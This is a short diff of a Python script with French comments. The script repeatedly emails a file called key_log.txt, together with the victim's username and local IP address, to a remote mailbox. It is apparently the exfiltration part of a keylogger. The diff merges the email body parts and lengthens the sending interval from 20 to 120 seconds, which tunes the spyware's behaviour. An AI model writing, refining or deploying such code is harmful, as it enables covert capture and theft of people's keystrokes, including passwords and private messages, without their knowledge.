@@ -27,8 +27,8 @@ m = "Nom d'utilisateur  : %s" % USER_NAME
 
 #message envoye avec le fichier key_log.txt
 body = "Fichier envoye avec succes \n Adresse IP de l'utilisateur : %s\n" % [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][0]  
-msg.attach(MIMEText(body, 'plain'))
-msg.attach(MIMEText(m, 'plain'))
+n=body+m
+msg.attach(MIMEText(n, 'plain'))
 
 filename = "key_log.txt"
 attachment = open(filename, "rb")
@@ -55,7 +55,7 @@ def envoi():
 # par exemple, si vous voulez mettre 90 secondes , il suffit juste de
 #supprimer 120 et la remplacer par 90 : time.sleep(90)
 while 1:
-        time.sleep(20)
+        time.sleep(120)
         envoi()
 
 
